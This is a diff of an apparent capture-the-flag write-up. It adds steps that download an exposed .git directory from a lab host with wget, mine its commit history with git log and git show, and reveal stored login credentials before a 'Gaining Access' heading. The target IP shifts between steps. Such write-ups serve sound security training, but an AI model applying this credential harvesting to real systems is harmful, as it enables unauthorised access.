@@ -30,7 +30,7 @@ nmap -sCV -p22,80 192.168.1.210 -oN targeted
 ![image](https://github.com/user-attachments/assets/df1662e7-8ff5-4ea0-9eb2-bd2c1f0f207f)
 ![image](https://github.com/user-attachments/assets/e7765820-701f-4ab2-bba6-afb011e37593)<br>
 <br>
-This machine is a Ubuntu Focal
+#### **This machine is a Ubuntu Focal**
 
 <h2><picture><img src="https://media2.giphy.com/media/QssGEmpkyEOhBCb7e1/giphy.gif?cid=ecf05e47a0n3gi1bfqntqmob8g9aid1oyj2wr3ds3mg700bl&rid=giphy.gif" width ="25"> </picture>PORT 80</h2>
 
@@ -67,7 +67,32 @@ whatweb "http://192.168.1.210"
 <br>
 <br>
 #### **Download content for analysis**
+```bash
+wget -r http://192.168.1.172/.git/
+```
+![image](https://github.com/user-attachments/assets/d7394a20-d0f7-4b50-af99-eecdee7674bb)
 
+#### **Checking gitlog of the repository**
+```bash
+git log
+```
+![image](https://github.com/user-attachments/assets/967b793f-91c8-4ca7-a92a-8783711c90d6)
+
+```bash
+git log --oneline
+```
+![image](https://github.com/user-attachments/assets/7285dea1-a75d-4c84-9816-e2779fd60645)
+
+```bash
+git show a4d900a
+```
+![image](https://github.com/user-attachments/assets/d01f05b0-960f-492b-aa69-978889012c18)
+
+#### **We finally have credentials**
+User:    lush@admin.com
+Paswwd:  321
+
+<h1><picture><img src="https://media2.giphy.com/media/QssGEmpkyEOhBCb7e1/giphy.gif?cid=ecf05e47a0n3gi1bfqntqmob8g9aid1oyj2wr3ds3mg700bl&rid=giphy.gif" width ="25"> </picture>Gaining Access</h1>
 
 
 
